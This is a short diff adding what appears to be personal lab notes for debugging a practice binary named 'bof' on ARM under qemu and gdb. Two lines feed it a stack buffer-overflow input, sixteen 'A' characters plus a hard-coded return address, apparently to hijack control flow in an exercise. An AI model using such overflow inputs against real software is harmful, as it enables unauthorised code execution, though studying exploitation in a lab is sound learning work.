@@ -1,0 +1,8 @@
+set arc arm
+target remote localhost:8888
+symbol-file ./bof
+qemu-arm-static -L /usr/arm-linux-gnueabi -g 31338 ./bof -fno-stack-protector -z execstack
+
+qemu-arm-static -L /usr/arm-linux-gnueabi -g 8888 ./bof `python -c 'print "A"*16+"\x2c\x04\x01\x00"'`
+
+qemu-arm-static -L /usr/arm-linux-gnueabi -g 8888 ./bof `python -c 'print "A"*16+"\x38\x04\x01\x00"'`
